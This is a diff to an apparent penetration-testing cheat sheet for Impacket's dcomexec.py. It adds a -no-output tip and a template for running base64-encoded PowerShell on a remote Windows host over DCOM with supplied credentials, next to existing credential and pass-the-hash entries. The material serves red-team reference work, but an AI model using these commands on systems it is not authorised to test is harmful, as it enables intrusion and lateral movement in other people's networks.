@@ -7,11 +7,17 @@
 ## desc
 ```
 Execute a command or semi interactive shell without touching the disk or running a new service using DCOM
+In case the TCP port 445 is not available, we can use the option -no-output.
 ```
 
 ## execute (creds)
 ```bash
 dcomexec.py -debug -shell-type powershell <domain_fqdn>/<user>:'<password>'@<target_fqdn> <cmd|>
+```
+
+## execute powershell encoded (creds)
+```bash
+dcomexec.py -debug <domain_fqdn>/<user>:'<password>'@<target_fqdn> "powershell -e <powershell_encoded|>"
 ```
 
 ## execute (pth)
